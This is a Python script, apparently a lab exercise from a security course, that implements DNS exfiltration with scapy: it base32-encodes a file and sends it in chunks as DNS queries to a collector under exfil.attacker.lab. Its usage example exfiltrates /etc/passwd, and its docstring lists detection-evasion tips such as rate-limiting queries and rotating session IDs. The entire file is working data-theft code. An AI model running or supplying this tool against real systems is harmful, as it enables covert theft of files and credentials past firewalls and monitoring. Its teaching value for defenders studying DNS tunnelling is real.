#!/usr/bin/env python3
"""
Module 6 — Exercise 6-B: DNS Exfiltration (Sender)

Encodes a file in base32, splits into DNS-query-safe chunks,
and sends each chunk as a DNS query for:
    <base32_chunk>.<seq>.<session_id>.exfil.attacker.lab

The collector (dns_collector.py) listens on UDP/53 and reassembles.

This technique is used by real-world APT groups (e.g., DNScat2, Iodine).
It works because:
  - DNS queries almost always pass outbound firewalls
  - DNS traffic volume is high enough that extra queries often go unnoticed
  - Queries reach attacker-controlled DNS server without direct TCP connection

Usage:
  # On attacker: start the collector first
  sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/received.txt

  # On target (or attacker for demo):
  sudo python3 module6/dns_exfil.py --file /etc/passwd --collector 10.0.0.1

Detection evasion:
  - Use --delay to rate-limit queries (stay under 10 DNS/min baseline)
  - Rotate session IDs to look like different clients
  - Use common-looking domain names
"""

import argparse
import base64
import hashlib
import os
import random
import time

from scapy.all import IP, UDP, DNS, DNSQR, send, conf

conf.verb = 0

EXFIL_DOMAIN = "exfil.attacker.lab"
CHUNK_SIZE   = 32    # base32 characters per chunk (stays within DNS label 63-char limit)
DNS_PORT     = 53


def encode_file(path: str) -> list[str]:
    """Read file, base32 encode, split into chunks safe for DNS labels."""
    with open(path, "rb") as f:
        data = f.read()

    # Base32 produces only A-Z and 2-7, all valid DNS label characters
    encoded = base64.b32encode(data).decode().lower()
    chunks  = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    return chunks, data


def send_dns_query(qname: str, target_resolver: str):
    """Send a DNS query for qname to target_resolver."""
    pkt = (
        IP(dst=target_resolver)
        / UDP(dport=DNS_PORT, sport=random.randint(1024, 65535))
        / DNS(
            id=random.randint(1, 0xFFFF),
            rd=1,
            qd=DNSQR(qname=qname, qtype="A"),
        )
    )
    send(pkt, verbose=False)


def exfiltrate(
    file_path: str,
    collector_ip: str,
    session_id: str | None = None,
    delay: float = 0.2,
    verbose: bool = True,
):
    if not os.path.exists(file_path):
        print(f"[-] File not found: {file_path}")
        return

    if session_id is None:
        # 8-char hex session ID derived from file path + timestamp
        session_id = hashlib.md5(f"{file_path}{time.time()}".encode()).hexdigest()[:8]

    chunks, original = encode_file(file_path)
    total_chunks = len(chunks)
    checksum = hashlib.md5(original).hexdigest()[:8]

    if verbose:
        print(f"[*] File:    {file_path}  ({len(original)} bytes)")
        print(f"[*] Chunks:  {total_chunks}  (chunk_size={CHUNK_SIZE} base32 chars)")
        print(f"[*] Session: {session_id}")
        print(f"[*] MD5:     {checksum}")
        print(f"[*] Sending to collector at {collector_ip}\n")

    # Step 1: announce the transfer
    # Query format: start.<total>.<checksum>.<session_id>.exfil.attacker.lab
    announce = f"start.{total_chunks}.{checksum}.{session_id}.{EXFIL_DOMAIN}"
    send_dns_query(announce, collector_ip)
    if verbose:
        print(f"[*] Sent announce: {announce}")
    time.sleep(delay)

    # Step 2: send data chunks
    for seq, chunk in enumerate(chunks):
        # Query: <data_chunk>.<seq>.<session_id>.exfil.attacker.lab
        qname = f"{chunk}.{seq}.{session_id}.{EXFIL_DOMAIN}"
        send_dns_query(qname, collector_ip)

        if verbose:
            pct = (seq + 1) / total_chunks * 100
            print(f"\r  [{pct:5.1f}%] chunk {seq+1:4d}/{total_chunks}  {qname[:40]}...", end="", flush=True)

        time.sleep(delay)

    # Step 3: end marker
    end_marker = f"end.{total_chunks}.{checksum}.{session_id}.{EXFIL_DOMAIN}"
    send_dns_query(end_marker, collector_ip)

    if verbose:
        print(f"\n[+] Transfer complete: {total_chunks} chunks sent")
        print(f"[+] End marker: {end_marker}")
        print(f"\n[*] On collector, check for reassembled file")


def main():
    parser = argparse.ArgumentParser(description="DNS exfiltration sender")
    parser.add_argument("--file",      required=True,  help="File to exfiltrate")
    parser.add_argument("--collector", required=True,  help="Collector IP (attacker's DNS server)")
    parser.add_argument("--session",   default=None,   help="Session ID (auto-generated if not set)")
    parser.add_argument("--delay",     type=float, default=0.2, help="Delay between queries (s)")
    parser.add_argument("--quiet",     action="store_true")
    args = parser.parse_args()

    exfiltrate(
        file_path=args.file,
        collector_ip=args.collector,
        session_id=args.session,
        delay=args.delay,
        verbose=not args.quiet,
    )


if __name__ == "__main__":
    main()
